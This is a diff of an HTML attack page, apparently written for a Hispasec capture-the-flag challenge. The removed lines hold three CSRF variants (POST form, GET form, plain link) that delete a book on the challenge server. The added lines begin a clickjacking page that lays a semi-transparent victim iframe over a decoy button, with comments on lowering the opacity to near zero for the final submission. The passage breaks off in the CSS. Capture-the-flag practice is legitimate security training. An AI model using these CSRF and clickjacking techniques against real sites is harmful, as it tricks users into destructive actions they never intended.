@@ -1,30 +1,52 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
 <head>
-    <meta charset="utf-8">
-    <title>attack</title>
-</head>
-<body>
+    <meta charset="UTF-8">
+    <title>Clickjacking Challenge</title>
+    <style>
+        /* Reseteo de márgenes para evitar descuadres entre navegadores */
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background-color: white;
+        }
 
-<!-- Variante 1: POST directo -->
-<form action="https://ctf.fap.hispasec.com:8018/books/1/delete" method="POST">
-    <input type="hidden" name="_csrf" value="anything">
-    <button id="objetivo" type="submit">
-        Click me
-    </button>
-</form>
+        /* Contenedor con ancho fijo para estabilizar el diseño de la víctima */
+        #wrapper {
+            position: relative;
+            width: 1000px;
+            margin: 0 auto;
+            height: 1200px;
+        }
 
-<!-- Variante 2: GET alternativo -->
-<form action="https://ctf.fap.hispasec.com:8018/books/1/delete" method="GET">
-    <button type="submit">
-        fallback
-    </button>
-</form>
+        /* Capa 1: El Iframe de la Víctima (ENCIMA) */
+        /* Lo ponemos arriba para que reciba el clic real del bot */
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            z-index: 2;
+            /* CALIBRACIÓN: Cambia a 0.0001 para el envío final */
+            opacity: 0.5; 
+            pointer-events: auto;
+        }
 
-<!-- Variante 3: Link directo -->
-<a href="https://ctf.fap.hispasec.com:8018/books/1/delete">
-    direct
-</a>
-
-</body>
-</html>
+        /* Capa 2: El botón que busca el bot (DEBAJO) */
+        /* El bot buscará las coordenadas de este ID y hará click ahí */
+        #objetivo {
+            position: absolute;
+            z-index: 1;
+            
+            /* COORDENADAS AJUSTADAS (Basadas en tu pantalla FHD) */
+            top: 795px;    
+            left: 15px;
+            
+            /* Tamaño amplio para asegurar el impacto */
+            width: 280px;
+            height: 70px;
